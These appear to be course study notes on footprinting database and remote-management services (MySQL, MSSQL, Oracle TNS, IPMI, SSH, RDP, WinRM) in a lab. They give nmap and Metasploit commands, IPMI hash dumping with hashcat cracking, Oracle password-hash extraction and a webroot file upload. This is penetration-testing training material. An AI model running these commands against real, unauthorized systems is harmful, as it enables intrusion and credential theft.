    cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
    
    [client]
    port		= 3306
    socket		= /var/run/mysqld/mysqld.sock
    
    [mysqld_safe]
    pid-file	= /var/run/mysqld/mysqld.pid
    socket		= /var/run/mysqld/mysqld.sock
    nice		= 0
    
    [mysqld]
    skip-host-cache
    skip-name-resolve
    user		= mysql
    pid-file	= /var/run/mysqld/mysqld.pid
    socket		= /var/run/mysqld/mysqld.sock
    port		= 3306
    basedir		= /usr
    datadir		= /var/lib/mysql
    tmpdir		= /tmp
    lc-messages-dir	= /usr/share/mysql
    explicit_defaults_for_timestamp
    
    symbolic-links=0
    
    !includedir /etc/mysql/conf.d/


<a id="orged9f7a5"></a>

### Dangerous Settings

Many things can be misconfigured with MySQL:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Setting</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">user</td>
<td class="org-left">Sets which user the MySQL service will run as.</td>
</tr>


<tr>
<td class="org-left">password</td>
<td class="org-left">Sets the password for the MySQL user.</td>
</tr>


<tr>
<td class="org-left">admin<sub>address</sub></td>
<td class="org-left">The IP address on which to listen for TCP/IP connections on the administrative network interface.</td>
</tr>


<tr>
<td class="org-left">debug</td>
<td class="org-left">This variable indicates the current debugging settings.</td>
</tr>


<tr>
<td class="org-left">sql<sub>warnings</sub></td>
<td class="org-left">Controls whether single-row INSERT statements produce an information string if warnings occur.</td>
</tr>


<tr>
<td class="org-left">secure<sub>file</sub><sub>priv</sub></td>
<td class="org-left">Used to limit the effect of data import and export operations.</td>
</tr>
</tbody>
</table>

The settings `user`, `password`, and `admin_address` are <span class="underline">security-relevant</span> because the entries are made in plain text.


<a id="org83900bb"></a>

### Footprinting the Service

1.  Nmap

        sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

2.  Interaction with the MySQL Server

    1.  Login
    
        with no pass
        
            mysql -u root -h 10.129.14.132
        
        with pass
        
            mysql -u root -pP4SSw0rd -h 10.129.14.128
    
    2.  Command
    
        show databases:
        
            show databases;
        
        show version:
        
            select version();
        
        use specific database:
        
            use mysql;
        
        show tables:
        
            show tables;	
        
        The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema` (`information_schema`). The system schema contains tables, information, and metadata necessary for management.
        change table:
        
            use sys;
        
        show tables:
        
            show tables;  
            
            +-----------------------------------------------+
            | Tables_in_sys                                 |
            +-----------------------------------------------+
            | host_summary                                  |
            | host_summary_by_file_io                       |
            | host_summary_by_file_io_type                  |
            | host_summary_by_stages                        |
            | host_summary_by_statement_latency             |
            | host_summary_by_statement_type                |
            | innodb_buffer_stats_by_schema                 |
            | innodb_buffer_stats_by_table                  |
            | innodb_lock_waits                             |
            | io_by_thread_by_latency                       |
            ...SNIP...
            | x$waits_global_by_latency                     |
            +-----------------------------------------------+	
        
            select host, unique_users from host_summary;
            +-------------+--------------+                   
            | host        | unique_users |                   
            +-------------+--------------+                   
            | 10.129.14.1 |            1 |                   
            | localhost   |            2 |                   
            +-------------+--------------+   
        
        The `information schema` is also a database that contains metadata. However, this metadata is mainly retrieved from the `system schema` database.


<a id="org8ef17ef"></a>

## MSSQL\\1433

"`MSSQL`," it refers to Microsoft SQL Server, a relational database management system developed by Microsoft. Like MySQL, it's used to store and retrieve data as requested by other software applications. However, MSSQL is a proprietary system, unlike MySQL, which is open-source.

Microsoft SQL Server is known for its robustness, scalability, and integration with other Microsoft products. It supports various editions catering to different needs, ranging from small applications to large enterprise-level solutions. It utilizes `Transact-SQL` (T-SQL), a <span class="underline">variant of SQL</span>, for querying and managing data.


<a id="org9e1d742"></a>

### Core

1.  MSSQL Clients

    [SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately.
    Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from.
    Many other clients can be used to access a database running on MSSQL:
    
    -   [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
    -   [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)
    -   [HeidiSQL](https://www.heidisql.com/)
    -   [SQLPro](https://www.macsqlclient.com/)
    -   [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

2.  MSSQL Database

    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Default System Database</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">master</td>
    <td class="org-left">Tracks all system information for an SQL server instance.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">model</td>
    <td class="org-left">Serves as a template database for new database creation. Settings changed here reflect in subsequently created databases.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">msdb</td>
    <td class="org-left">Utilized by SQL Server Agent for scheduling jobs and alerts.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">tempdb</td>
    <td class="org-left">Dedicated for storing temporary objects.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">resource</td>
    <td class="org-left">Read-only database housing system objects bundled with SQL Server.</td>
    </tr>
    </tbody>
    </table>


<a id="orga8d0aef"></a>

### Default Configuration

When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`.
Authentication being set to `Windows Authentication~` means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system.


<a id="org971648e"></a>

### Dangerous Settings

In an IT administrator's shoes during an engagement, it's crucial to consider potential `misconfigurations` that might compromise systems. The IT landscape is fast-paced, often juggling multiple projects, leading to the potential for errors—where even a small misconfiguration can jeopardize a critical server or service.

This risk extends to MSSQL configurations, where admins might inadvertently set up:

-   `Unencrypted MSSQL Client Connections`: Failure to use encryption between clients and the MSSQL server, exposing data during transmission.
-   `Self-Signed Certificates for Encryption`: Reliance on self-signed certificates, vulnerable to spoofing, despite using encryption, risking compromised security.
-   `Usage of Named Pipes`: Vulnerability arising from the use of named pipes, potentially open to exploitation.
-   `Weak or Default 'sa' Credentials`: Overlooking the disabling of default 'sa' (`system administrator`) credentials, leaving a significant security loophole if left unchanged or set with weak passwords.


<a id="org93f08ff"></a>

### Footprinting the Service

1.  Nmap

        sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

2.  Mwtasploit

    We can also use Metasploit to run an auxiliary scanner called `mssql_ping`.
    
        msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
        
        rhosts => 10.129.201.248
        
        
        msf6 auxiliary(scanner/mssql/mssql_ping) > run
        
        [*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
        [+] 10.129.201.248:       -    ServerName      = SQL-01
        [+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
        [+] 10.129.201.248:       -    IsClustered     = No
        [+] 10.129.201.248:       -    Version         = 15.0.2000.5
        [+] 10.129.201.248:       -    tcp             = 1433
        [+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
        [*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
        [*] Auxiliary module execution completed

3.  Mssqlclient.py

    If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`).
    
        python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth


<a id="org6dd716c"></a>

## Oracle TNS\\1521

The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.
TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks.
Over time, TNS has been updated to support newer technologies, including IPv6 and SSL/TLS encryption which makes it more suitable for the following purposes:

-   Name Resolution
-   Connection management
-   Load balancing
-   Security


<a id="orgc5c496f"></a>

### Default Configuration

The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `ORACLE_HOME/network/admin` directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.

Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service.
<span class="underline">Tnsnames.ora</span>

    ORCL =
      (DESCRIPTION =
        (ADDRESS_LIST =
          (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
        )
        (CONNECT_DATA =
          (SERVER = DEDICATED)
          (SERVICE_NAME = orcl)
        )
      ) 

Here we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name orcl when connecting to the service.

<span class="underline">Listener.ora</span>

    SID_LIST_LISTENER =
      (SID_LIST =
        (SID_DESC =
          (SID_NAME = PDB1)
          (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
          (GLOBAL_DBNAME = PDB1)
          (SID_DIRECTORY_LIST =
            (SID_DIRECTORY =
              (DIRECTORY_TYPE = TNS_ADMIN)
              (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
            )
          )
        )
      )
    
    LISTENER =
      (DESCRIPTION_LIST =
        (DESCRIPTION =
          (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
          (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
        )
      )
    
      ADR_BASE_LISTENER = C:\oracle

In short, the client-side Oracle Net Services software uses the tnsnames.ora file to resolve service names to network addresses, while the listener process uses the listener.ora file to determine the services it should listen to and the behavior of the listener.

Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution.

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Setting</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">DESCRIPTION</td>
<td class="org-left">Provides a descriptor for the database and its connection type.</td>
</tr>


<tr>
<td class="org-left">ADDRESS</td>
<td class="org-left">Network address of the database, including the hostname and port number.</td>
</tr>


<tr>
<td class="org-left">PROTOCOL</td>
<td class="org-left">Network protocol used for communication with the server.</td>
</tr>


<tr>
<td class="org-left">PORT</td>
<td class="org-left">Port number used for communication with the server.</td>
</tr>


<tr>
<td class="org-left">CONNECT<sub>DATA</sub></td>
<td class="org-left">Specifies connection attributes: service name or SID, protocol, and database instance identifier.</td>
</tr>


<tr>
<td class="org-left">INSTANCE<sub>NAME</sub></td>
<td class="org-left">Name of the database instance the client aims to connect.</td>
</tr>


<tr>
<td class="org-left">SERVICE<sub>NAME</sub></td>
<td class="org-left">Name of the service the client intends to connect to.</td>
</tr>


<tr>
<td class="org-left">SERVER</td>
<td class="org-left">Type of server used for the database connection (e.g., dedicated or shared).</td>
</tr>


<tr>
<td class="org-left">USER</td>
<td class="org-left">Username for authenticating with the database server.</td>
</tr>


<tr>
<td class="org-left">PASSWORD</td>
<td class="org-left">Password for authenticating with the database server.</td>
</tr>


<tr>
<td class="org-left">SECURITY</td>
<td class="org-left">Type of security for the connection.</td>
</tr>


<tr>
<td class="org-left">VALIDATE<sub>CERT</sub></td>
<td class="org-left">Whether to validate the certificate using SSL/TLS.</td>
</tr>


<tr>
<td class="org-left">SSL<sub>VERSION</sub></td>
<td class="org-left">Version of SSL/TLS to use for the connection.</td>
</tr>


<tr>
<td class="org-left">CONNECT<sub>TIMEOUT</sub></td>
<td class="org-left">Time limit in seconds for the client to establish a connection to the database.</td>
</tr>


<tr>
<td class="org-left">RECEIVE<sub>TIMEOUT</sub></td>
<td class="org-left">Time limit in seconds for the client to receive a response from the database.</td>
</tr>


<tr>
<td class="org-left">SEND<sub>TIMEOUT</sub></td>
<td class="org-left">Time limit in seconds for the client to send a request to the database.</td>
</tr>


<tr>
<td class="org-left">SQLNET.EXPIRE<sub>TIME</sub></td>
<td class="org-left">Time limit in seconds for the client to detect a failed connection.</td>
</tr>


<tr>
<td class="org-left">TRACE<sub>LEVEL</sub></td>
<td class="org-left">Level of tracing for the database connection.</td>
</tr>


<tr>
<td class="org-left">TRACE<sub>DIRECTORY</sub></td>
<td class="org-left">Directory where the trace files are stored.</td>
</tr>


<tr>
<td class="org-left">TRACE<sub>FILE</sub><sub>NAME</sub></td>
<td class="org-left">Name of the trace file.</td>
</tr>


<tr>
<td class="org-left">LOG<sub>FILE</sub></td>
<td class="org-left">File where log information is stored.</td>
</tr>
</tbody>
</table>


<a id="orgb652922"></a>

### Tools

Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our Pwnbox instance in case it does not have these already.

    #!/bin/bash
    
    sudo apt-get install libaio1 python3-dev alien python3-pip -y
    git clone https://github.com/quentinhardy/odat.git
    cd odat/
    git submodule init
    git submodule update
    sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
    pip3 install cx_Oracle
    sudo apt-get install python3-scapy -y
    sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
    sudo pip3 install argcomplete && sudo activate-global-python-argcomplete

1.  ODAT

        ./odat.py -h
    
    `Oracle Database Attacking Tool` (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases.

2.  Nmap

        sudo nmap -p1521 -sV 10.129.204.235 --open

3.  Nmap - SID Bruteforcing

    The `SIDs` are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to.
    If the client specifies an incorrect SID, the connection attempt will fail.
    \*There are various ways to enumerate, or better said, guess `SIDs`. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.
    
        sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

4.  ODAT

        ./odat.py all -s 10.129.204.235

5.  SQLplus - Log In

        sqlplus scott/tiger@10.129.204.235/XE
    
    If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).
    
        sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

6.  Oracle RDBMS - Interaction

        SQL> select table_name from all_tables;
        SQL> select * from user_role_privs;

7.  Oracle RDBMS - Database Enumeration

    Here, the user scott has no administrative privileges. However, we can try using this account to log in as the System Database Admin (sysdba), giving us higher privileges. This is possible when the user scott has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.
    
        sqlplus scott/tiger@10.129.204.235/XE as sysdba

8.  Oracle RDBMS - Extract Password Hashes

        SQL> select name, password from sys.user$;

9.  Oracle RDBMS - File Upload

        ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
    
    and
    
        curl -X GET http://10.129.204.235/testing.txt


<a id="orge23eb91"></a>

## IPMI\\623

`Intelligent Platform Management Interface` (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring.
IPMI provides `sysadmins` with the `ability` to `manage` and `monitor` systems even if they are powered off or in an unresponsive state.
It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell.
IPMI can also be used for:

-   Before the OS has booted to modify BIOS settings
-   When the host is fully powered down
-   Access to a host after a system failure

When not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.
This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.
To function, IPMI requires the following components:

-   Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
-   Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
-   Intelligent Platform Management Bus (IPMB) - extends the BMC
-   IPMI Memory - stores things such as the system event log, repository store data, and more
-   Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus


<a id="org11abe90"></a>

### Footprinting the Service

IPMI communicates over port `623 UDP`. Systems that use the IPMI protocol are called `Baseboard Management Controllers` (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card.

1.  Nmap

        sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

2.  Metasploit Version Scan

        msf6 > use auxiliary/scanner/ipmi/ipmi_version 
        msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
        msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
        
        Module options (auxiliary/scanner/ipmi/ipmi_version):
        
           Name       Current Setting  Required  Description
           ----       ---------------  --------  -----------
           BATCHSIZE  256              yes       The number of hosts to probe in each set
           RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
           RPORT      623              yes       The target port (UDP)
           THREADS    10               yes       The number of concurrent threads
        
        
        msf6 auxiliary(scanner/ipmi/ipmi_version) > run
        
        [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
        [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
        [*] Scanned 1 of 1 hosts (100% complete)
        [*] Auxiliary module execution completed


<a id="org50c1979"></a>

### Dangerous Settings

If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.
And crack them with:

    hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

1.  Metasploit Dumping Hashes

        msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
        msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
        msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
        
        Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
        
           Name                 Current Setting                                                    Required  Description
           ----                 ---------------                                                    --------  -----------
           CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
           OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
           OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
           PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
           RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
           RPORT                623                                                                yes       The target port
           THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
           USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
        
        
        
        msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
        
        [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
        [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
        [*] Scanned 1 of 1 hosts (100% complete)
        [*] Auxiliary module execution completed


<a id="org4e42700"></a>

# Remote Management Protocols


<a id="org128cbe1"></a>

## Linux


<a id="orgf64c444"></a>

### SSH\\22

`Secure Shell` (`SSH`) facilitates secure, encrypted connections between computers over potentially insecure networks, typically on TCP port 22.
When managing a remote host, SSH allows interaction via command line or GUI. It enables `sending commands`, `file transfers`, and `port forwarding`, necessitating a secure SSH connection and authentication.

1.  Public Key Authentication

    1.  Server and Client Authentication
    
        Initially , the SSH server and client authenticate each other. The server sends a certificate to verify its identity, reducing the risk of third-party intervention during the initial connection.
    
    2.  Client Authentication
    
        Following server authentication, the client must prove access authorization. Typically, the server possesses an encrypted hash of the user's password. However, for enhanced security and convenience, public key and private key pairs are used instead.
        
        1.  Private Key
        
            Individual to the `user's computer` and secured with a passphrase stronger than typical passwords, the private key remains solely on the user's computer, ensuring its secrecy. 
        
        2.  Public Key on Server
        
            The server generates a cryptographic challenge based on the client's public key and sends it. The client decrypts this challenge with its private key, providing the solution to the server, thereby confirming a legitimate connection.

2.  Default Configuration

    The [sshd<sub>config</sub>](https://www.ssh.com/academy/ssh/sshd_config) file, responsible for the OpenSSH server, has only a few of the settings configured by default.
    
        cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'

3.  Dangerous Settings

    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Setting</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">PasswordAuthentication</td>
    <td class="org-left">Allows password-based authentication.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">PermitEmptyPasswords</td>
    <td class="org-left">Allows the use of empty passwords.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">PermitRootLogin</td>
    <td class="org-left">Allows logging in as the root user.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Protocol</td>
    <td class="org-left">Uses an outdated version of encryption.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">X11Forwarding</td>
    <td class="org-left">Allows X11 forwarding for GUI applications.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">AllowTcpForwarding</td>
    <td class="org-left">Allows forwarding of TCP ports.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">PermitTunnel</td>
    <td class="org-left">Allows tunneling.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">DebianBanner</td>
    <td class="org-left">Displays a specific banner when logging in.</td>
    </tr>
    </tbody>
    </table>
    
        Allowing password authentication allows us to brute-force a known username for possible passwords. Many different methods can be used to guess the passwords of users. For this purpose, specific patterns` are usually used to mutate the most commonly used passwords and, frighteningly, correct them.

4.  Footprinting the Service

    One of the tools we can use to fingerprint the SSH server is [ssh-audit](https://github.com/jtesta/ssh-audit).
    
        git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
        ./ssh-audit.py 10.129.14.132
    
    1.  Change Authentication Method
    
            ssh -v cry0l1t3@10.129.14.132
        
        For potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.
        
            ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password


<a id="orgd493702"></a>

### Rsync\\873

[Rsync](https://linux.die.net/man/1/rsync) is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts.
By default, it uses port `873` and can be configured to use ssh.

1.  Scann

        sudo nmap -sV -p 873 127.0.0.1

2.  Probing for Accessible Shares

        nc -nv 127.0.0.1 873

3.  Enumerating an Open Share

        rsync -av --list-only rsync://127.0.0.1/<share>
    
    If Rsync is configured to use SSH to transfer files, we could modify our commands to include the `-e ssh` flag, or -e "`ssh -p2222`" if a non-standard port is in use for SSH.


<a id="org1bfdb7e"></a>

### R-Services\\512,513,514

R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP.
No longer used in favor of ssh, much like `telnet`, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (MITM) attacks.
The [R-commands](https://en.wikipedia.org/wiki/Berkeley_r-commands) suite consists of the following programs:

-   rcp (`remote copy`)
-   rexec (`remote execution`)
-   rlogin (`remote login`)
-   rsh (`remote shell`)
-   rstat
-   ruptime
-   rwho (`remote who`)

The `/etc/hosts.equiv` file contains a list of trusted hosts and is used to grant access to other systems on the network.

    cat /etc/hosts.equiv

1.  Nmap

        sudo nmap -sV -p 512,513,514 10.0.17.2

2.  Logging in Using Rlogin

        rlogin 10.0.17.2 -l htb-student

3.  Listing Authenticated Users Using Rwho

        rwho
        
        root     web01:pts/0 Dec  2 21:34
        htb-student     workstn01:tty1  Dec  2 19:57  2:25   

4.  Listing Authenticated Users Using Rusers

        rusers -al 10.0.17.5


<a id="orgc5b7eec"></a>

## Windows

The main components used for remote management of Windows and Windows servers are the following:

-   Remote Desktop Protocol (`RDP`)
-   Windows Remote Management (`WinRM`)
-   Windows Management Instrumentation (`WMI`)


<a id="org35f3bb2"></a>

### RDP\\3389

RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port `3389` as the `transport protocol`.
For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside.
In addition, port forwarding must be set up on the NAT router in the direction of the server.
RDP has handled [Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security) (`TLS/SSL`) since Windows Vista, which means that all data, and especially the login process, is protected in the network by its good encryption.
The `Remote Desktop` service is installed by default on Windows servers and does not require additional external applications.
This service can be activated using the `Server Manager` and comes with the default setting to allow connections to the service only to hosts with [Network level authentication](https://en.wikipedia.org/wiki/Network_Level_Authentication) (`NLA`).

1.  Footprinting the Service

    Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if `NLA` is enabled on the server or not, the product version, and the hostname.
    
    1.  Nmap
    
            nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
        
        In addition, we can use `--packet-trace` to track the individual packages and inspect their contents manually. We can see that the `RDP cookies` (`mstshash=nmap`) used by Nmap to interact with the RDP server can be identified by threat hunters and various security services such as Endpoint Detection and Response (`EDR`), and can lock us out as penetration testers on hardened networks.
        
            nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n

2.  RDP Security Check - Install

    A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.
    
        sudo cpan

3.  RDP Security Check

        git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
        ./rdp-sec-check.pl 10.129.201.248

4.  Initiate an RDP Session

    Authentication and connection to such RDP servers can be made in several ways. For example, we can connect to RDP servers on Linux using `xfreerdp`, `rdesktop`, or `Remmina` and interact with the GUI of the server accordingly.
    
        xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248


<a id="orgf728ebd"></a>

### WinRM\\5985,5986

The `Windows Remote Management` (`WinRM`) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the `Simple Object Access Protocol` (`SOAP`) to establish connections to remote hosts and their applications.
Another component that fits WinRM for administration is Windows Remote Shell (`WinRS`), which lets us execute arbitrary commands on the remote system.

1.  Footprinting the Service

    As we already know, WinRM uses TCP ports 5985 (`HTTP`) and 5986 (`HTTPS`) by default, which we can scan using Nmap.
    
    1.  Nmap WinRM
    
            nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
        
        If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The [West-WsMan](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) `cmdlet` is responsible for this, and the host's name in question is passed to it.
    
    2.  Initiate an RDB in UNIX
    
        In Linux-based environments, we can use the tool called [evil-winrm](https://github.com/Hackplayers/evil-winrm), another penetration testing tool designed to interact with WinRM.
        
            evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!


<a id="org64d5a46"></a>

### WMI\\135

Windows Management Instrumentation (WMI) is Microsoft's implementation and also an extension of the Common Information Model (CIM), core functionality of the standardized Web-Based Enterprise Management (WBEM) for the Windows platform.
WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (WMIC).

1.  Footprinting the Service

    The initialization of the WMI communication always takes place on TCP port 135, and after the successful establishment of the connection, the communication is moved to a random port.
    
    Program [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) from the Impacket toolkit can be used for this.
    
        /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

